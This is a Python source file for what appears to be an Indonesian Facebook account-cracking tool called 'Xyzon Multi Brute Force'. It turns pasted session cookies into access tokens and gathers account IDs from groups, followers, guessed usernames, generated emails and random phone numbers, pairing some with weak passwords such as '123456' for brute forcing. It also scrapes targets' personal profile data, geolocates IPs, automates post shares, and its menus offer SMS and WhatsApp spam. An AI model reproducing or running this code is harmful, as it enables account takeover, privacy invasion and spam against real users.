M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -m
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
###----------[ DINI HARI ]---------- ###
def Definisi__Waktu():
        now = datetime.now()
        hours = now.hour
        if 4 <= hours < 10:timenow = "Selamat Pagi"
        elif 10 <= hours < 15:timenow = "Selamat Siang"
        elif 15 <= hours < 18:timenow = "Selamat Sore"
        else:timenow = "Selamat Malam"
        return timenow
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#

def banner():
	cetak(panel(f"""[bold red]●[bold yellow] ●[bold green] ●                                    
[bold green]                       _  _ _   _ ___  ____ _  _    _  _ ___  
[bold green]                        \/   \_/    /  |  | |\ | __  \/  |  \ 
[bold green]                       _/\_   |    /__ |__| | \|    _/\_ |__/ 
                                                                               [bold red]●[bold yellow] ●[bold green] ●
             """,width=90,title=f"[bold cyan][[bold white] {Definisi__Waktu()} [bold cyan]]",subtitle=f"[bold cyan][[bold white] SELAMAT DATANG DI LAYANAN KAMI BOSSKU [bold cyan]]",style=f"bold cyan"))
#--------------------[ BAGIAN-MASUK ]--------------#
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.3)
        sys.stdout.write(f"\r {P}[{O}!{P}] Sedang Memeriksa Cookies... " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
		
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel(' [bold green]• [bold white]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold cyan"))
		asu = random.choice([m,k,h,b,u])
		your_cookies=input(f'  [{O}•{x}]\x1b[1;97m Masukkan Cookies :{asu} ')
		loading()
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" \x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m \x1b[1;91mCookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n \x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Token Anda : {asu}{access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n \x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97mLogin Berhasil | Ketik Perintah Di Bawah Ini")
							print(" \x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97mpython cakculay.py");exit()
			except Exception as e:
				print(" \x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m\x1b[1;91m Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	xyzondev = []
	xyzondevngentot = []
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(panel(f"[bold yellow]  Xyzon Dev Raja Kegelapan Dari Timur Untuk Menguasai Dunia Member Tiga Negara 3D",width=90,title=f"",padding=(0,1),style=f"bold cyan"))
	xyzondev.append(panel(f'[bold white][[bold cyan]+[/][bold white]][/] [bold white] Username : [bold yellow]{my_name}[/]\n[bold white][[bold cyan]+[/][bold white]][/]  [bold white]User Idz : [bold yellow]{my_id}[/]\n[bold white][[bold cyan]+[/][bold white]][/]  [bold white]User IP  : [bold yellow]{ip}[/][/]\n[bold white][[bold cyan]+[/][bold white]][/]  [bold white]Tanggal  : [bold yellow]{tgl} {bln} {thn}[/][/] ',width=43,title=f"[bold white]Info-User",style=f"bold cyan"))
	xyzondev.append(panel(f'[bold white][[bold cyan]+[/][bold white]][/]  [bold white]Author : [bold green]Xyzon Dev[/]\n[bold white][[bold cyan]+[/][bold white]][/]  [bold white]NameSC : [bold green]Xyzon Multi Brute Force[/]\n[bold white][[bold cyan]+[/][bold white]][/]  [bold white]Versi  : [bold green]2.8[/][/]\n[bold white][[bold cyan]+[/][bold white]][/]  [bold white]Status : [bold green]Premium[/][/] ',width=44,title=f"[bold white]Info-Author",style=f"bold cyan"))
	wa.print(Columns(xyzondev))
	cetak(panel(f"[bold green]  Daftar Menu",width=90,title=f"",padding=(0,35),style=f"bold cyan"))
	xyzondevngentot.append(panel(f'[bold white][[bold cyan]01[bold white]] Crack ID Dari Publick [[bold green] ON [bold white]]\n[bold white][[bold cyan]02[bold white]] Crack ID Dari Massal [[bold green] ON [bold white]]\n[bold white][[bold cyan]03[bold white]] Crack ID Dari Followers [[bold green] ON [bold white]]\n[bold white][[bold cyan]04[bold white]] Crack ID Dari File [[bold green] ON [bold white]]\n[bold white][[bold cyan]05[bold white]] Crack ID Dari Grup [[bold green] ON [bold white]]',width=43,title=f"",style=f"bold cyan"))
	xyzondevngentot.append(panel(f'[bold white][[bold cyan]06[bold white]] Crack ID Dari Username [[bold green] ON [bold white]]\n[bold white][[bold cyan]07[bold white]] Crack ID Dari Email [[bold green] ON [bold white]]\n[bold white][[bold cyan]08[bold white]] Crack ID Dari Nomor [[bold green] ON [bold white]]\n[bold white][[bold cyan]09[bold white]] Check ID Result [[bold green] ON [bold white]][bold white]\n[[bold cyan]00[bold white]][bold red] Delete Cookies [bold white][[bold green] ON [bold white]]',width=44,title=f"",style=f"bold cyan"))
	wa.print(Columns(xyzondevngentot))
	cetak(panel(f'                [bold white]Ketik [bold red]Menu[bold white] Untuk Ke Menu Tambahan Di Dalam Script Ini',width=90,title=f"[bold green]Informasi Crack",style=f"bold cyan"))
	_____xyzon___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____xyzon___xd____ in ['1','01']:
		brayen_dump()
	elif _____xyzon___xd____ in ['2','02']:
		dump_massal()
	elif _____xyzon___xd____ in ['3','03']:
		pengikut()
	elif _____xyzon___xd____ in ['4','04']:
		crack_file()
	elif _____xyzon___xd____ in ['5','05']:
		crack_group()
	elif _____xyzon___xd____ in ['6','06']:
		crack_nama()
	elif _____xyzon___xd____ in ['7','07']:
		crack_email()
	elif _____xyzon___xd____ in ['8','08']:
		crack_nomor()
	elif _____xyzon___xd____ in ['9','09']:
		result()
	elif _____xyzon___xd____ in ['menu','Menu','MENU']:
		bot()
	elif _____xyzon___xd____ in ['info']:
		var_menu()
		var_tutor()
		tutor_target()
		tutor_crack()
		var_author()
		var_ugen()
		start_method()
		start_methodezz()
		started()
	elif _____xyzon___xd____ in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [+] {m}Sukses Logout+Hapus Cookies{x}')
		time.sleep(5)
		login()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		exit()
def error():
	print(f' [+] Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
#----------------------[ MENU CRACK ]----------------------#
def bot():
	xyzondev = []
	cetak(panel(f"[bold green]  Daftar MenuV2",width=90,title=f"",padding=(0,35),style=f"bold cyan"))
	xyzondev.append(panel(f'[bold white][[bold cyan]01[bold white]] Chekpoint Detector [[bold green] ON [bold white]]\n[bold white][[bold cyan]02[bold white]] Spam Sms [[bold green] ON [bold white]]\n[bold white][[bold cyan]03[bold white]] Get Headers [[bold green] ON [bold white]]\n[bold white][[bold cyan]04[bold white]] Track IP Andress [[bold green] ON [bold white]]',width=43,title=f"",style=f"bold cyan"))
	xyzondev.append(panel(f'[bold white][[bold cyan]05[bold white]] Spam WhatsApp [[bold green] ON [bold white]]\n[bold white][[bold cyan]06[bold white]] Bot Share FB [[bold green] ON [bold white]]\n[bold white][[bold cyan]07[bold white]] Get Data Target [[bold green] ON [bold white]]\n[bold white][[bold cyan]08[bold white]] Report Bug Script [[bold green] ON [bold white]]',width=44,title=f"",style=f"bold cyan"))
	wa.print(Columns(xyzondev))
	cetak(panel(f'                      [bold white]Ketik [bold red]back[bold white] Untuk Kembali Ke Menu Utama',width=90,title=f"[bold green]exit",style=f"bold cyan"))
	cakculayxyzon = input(f' [+] Pilih Menu Crack : ')
	if cakculayxyzon in(''):
		print(' [+] Pilih Yang Bener Asu ')
		time.sleep(3)
		back()
	if cakculayxyzon in('1','01'):
		file_cp()
	elif cakculayxyzon in('2','02'):
		spam_sms()
	elif cakculayxyzon in('3','03'):
		siu()
	elif cakculayxyzon in('4','04'):
		lacakip()
	elif cakculayxyzon in('5','05'):
		spam_wa()
	elif cakculayxyzon in('6','06'):
		memek()
	elif cakculayxyzon in('7','07'):
		target()
	elif cakculayxyzon in('ig','Instagram'):
		ggwp17()
	elif cakculayxyzon in('8','08'):
		cetak(panel(f"Apapun Bug Pada Script Tolong Laporkan Kepada Saya Agar Bisa Mengembangkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold green]Report Bug",padding=(0,3),style=f"bold white"))
		os.system("xdg-open https://wa.me/+6289622155832?text=Selamat+Pagi+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
		time.sleep(3)
		exit()
	elif cakculayxyzon in ['back','Back','BACK']:
		back()
#AMBIL DATA ORANG
def target():
    try:
        token = open(".token.txt","r").read()
    except IOError:
        jalan(m+" Cookie Kadaluarsa")
        time.sleep(0.5)
        login()
    try:
        idt = input ( "\33[1;96m╔══\x1b[1;96m[\x1b[1;97m•\x1b[1;96m]\x1b[1;97m ID Target \x1b[1;97m:\33[1;97m ")
        if idt == '':
            print ( "\33[1;96m╚══ \x1b[1;97m[\x1b[1;96m•\x1b[1;97m]\x1b[1;91m Masukan dengan benar bro");target()
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P));menu()
    try:nm = zy["name"]
    except (KeyError,IOError):nm = ("-")
    try:nd = zy["first_name"]
    except (KeyError,IOError):nd = ("-")
    try:nt = zy["middle_name"]
    except (KeyError,IOError):nt = ("-")
    try:nb = zy["last_name"]
    except (KeyError,IOError):nb = ("-")
    try:ut = zy["birthday"]
    except (KeyError,IOError):ut = ("-")
    try:gd = zy["gender"]
    except (KeyError,IOError):gd = ("-")
    try:em = zy["email"]
    except (KeyError,IOError):em = ("-")
    try:lk = zy["link"]
    except (KeyError,IOError):lk = ("-")
    try:us = zy["username"]
    except (KeyError,IOError):us = ("-")
    try:rg = zy["religion"]
    except (KeyError,IOError):rg = ("-")
    try:rl = zy["relationship_status"]
    except (KeyError,IOError):rl = ("-")
    try:rls = zy["significant_other"]["name"]
    except (KeyError,IOError):rls = ("-")
    try:lc = zy["location"]["name"]
    except (KeyError,IOError):lc = ("-")
    try:ht = zy["hometown"]["name"]
    except (KeyError,IOError):ht = ("-")
    try:ab = zy["about"]
    except (KeyError,IOError):ab = ("-")
    try:lo = zy["locale"]
    except (KeyError,IOError):lo = ("-")
    jalan('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nm))
    jalan('%s╠══[%s•%s] %sNama Depan : %s'%(O,P,O,P,nd))
    jalan('%s╠══[%s•%s] %sNama Tengah : %s'%(O,P,O,P,nt))
    jalan('%s╠══[%s•%s] %sNama Belakang : %s'%(O,P,O,P,nb))
    jalan('%s╠══[%s•%s] %sTTL : %s'%(O,P,O,P,ut))
    jalan('%s╠══[%s•%s] %sGender : %s'%(O,P,O,P,gd))
    jalan('%s╠══[%s•%s] %sEmail : %s'%(O,P,O,P,em))
    jalan('%s╠══[%s•%s] %sLink : %s'%(O,P,O,P,lk))
    jalan('%s╠══[%s•%s] %sUsername : %s'%(O,P,O,P,us))
    jalan('%s╠══[%s•%s] %sAgama : %s'%(O,P,O,P,rg))
    jalan('%s╠══[%s•%s] %sStatus Hubungan : %s'%(O,P,O,P,rl))
    jalan('%s╠══[%s•%s] %sHubungan Dengan : %s'%(O,P,O,P,rls))
    jalan('%s╠══[%s•%s] %sTempat Tinggal : %s'%(O,P,O,P,lc))
    jalan('%s╠══[%s•%s] %sTempat Asal : %s'%(O,P,O,P,ht))
    jalan('%s╠══[%s•%s] %sTentang : %s'%(O,P,O,P,ab))
    jalan('%s╠══[%s•%s] %sLocale : %s'%(O,P,O,P,lo))
    print('%s║'%(O))
    input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
    back()
#-----------------[ TRACK IP ]-----------------# 
def lacakip():
	link = input(f' \33[1;96m╔══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Masukan IP : \x1b[1;93m')
	url = 'http://ip-api.com/json/' + link
	r = requests.get(url)
	data = json.loads(r.text)
	latitude = data['lat']
	longitude = data['lon']
	google_maps_url = 'https://www.google.com/maps/place/' + str(latitude) + '+' + str(longitude)
	try:
		request = requests.get(url)
		response = request.json()
	except (requests.ConnectionError):
		print(" \33[1;96m╚══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;91m Koneksi Error")
		exit()
	if response['status'] == 'success':
		print('%s ║'%(O))
		print(" \33[1;96m╠══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Login : \x1b[1;92mSuccess")
		print(" \33[1;96m╠══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Alamat IP : \x1b[1;93m" + response['query'])
		print(" \33[1;96m╠══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Kota : \x1b[1;93m" + response['city'])
		print(" \33[1;96m╠══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Negara : \x1b[1;93m" + response['country'])
		print(" \33[1;96m╠══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Kode Negara : \x1b[1;93m" + response['countryCode'])
		print(" \33[1;96m╠══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Latitude : \x1b[1;93m" + str(response['lat']))
		print(" \33[1;96m╠══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Longitude : \x1b[1;93m" + str(response['lon']))
		print(" \33[1;96m╠══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m ISP :\x1b[1;93m " + response['isp'])
		print(" \33[1;96m╠══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;97m Link Google Maps : \x1b[1;93m", google_maps_url)
		print('%s ║'%(O))
		input('%s ╚══[ %sReturn %s]%s'%(O,P,O,P))
		back()
	else:
		print(" \33[1;96m╚══\x1b[1;97m[\x1b[1;96m+\x1b[1;97m]\x1b[1;91mAlamat IP Yang Dimasukkan Salah")
		
def siu():
	start()
	get_data_web()
	akhir()
#------------------[ DEFF BOT SHARE ]-------------------#
def memek():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		cookie = {"cookie":cok}
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	link = input(f" [+] Masukan Link Postingan : ")
	jumlah = int(input(f" [+] Masukan Share : "))
	memek = datetime.now()
	try:
		n = 0
		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
		for x in range(jumlah):
			n+=1
			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
			data = json.loads(post)
			if "id" in post:
				rianxyz = str(datetime.now()-memek).split('.')[0]
				print(f'\r [+] Berhasil MengShare {n} Postingan',end='')
				sys.stdout.flush()
			else:
				print("\n")
				cetak(nel(f'Bot Auto Share Telah Berhenti Mungkin Di Karna Cookie Telah Mokad',width=90,padding=0,style='bold white'));exit()
	except requests.exceptions.ConnectionError:
		print(f"\n [+] Anda Tidak Terhubung Ke Internet");exit() 	

#------------------[ CRACK NOMOR ]-------------------# 
def crack_nomor():
	cetak(nel('  Crack Menggunakan Nomor Wajib Menggunakan Sandi Manual Saat Crack ',width=90,padding=(0,8),style=f"bold white"))
	depan = input(' [+] Awalan Nomor : ')
	if len(depan)==3:pass
	else:exit(f' [+] Contoh Awalan Nomor 089')
	jumla = input(' [+] Jumlah : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in dump:pass
		else:dump.append(D+'|123456')
		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	setting() 
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	cetak(nel(' Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
	link = input(f' [+] Id Group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [+] Gagal Dump Id Grup, Kemungkinan Grup Private')
	setting()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1; Valve Steam GameOverlay/1679680416) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r [+] Mengumpulkan {len(id)} Idz...');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' [+] Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [+] Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()
#----------------------[ CRACK USERNAME ]----------------------#
def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=90,padding=(0,2),style=f"bold white"))
	nam = console.input(f' [+] Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
#-----------------[ CRACK EMAIL ]-----------------#
def crack_email():
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
	nama = console.input(f' \33[1;96m╔══ Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" \33[1;96m╚══ Masukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
	doma = console.input(f' \33[1;96m╔══ Masukan Nama Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" \33[1;96m╚══ Masukan Domain Dengan Benar")
		time.sleep(3);exit()
	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
	jumlah = console.input(f' \33[1;96m╚══ Total Dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r \33[1;96m╚══ Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
#-----------------[ CRACK FILE ]-----------------#
def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		print(' [+] File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(' [+] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
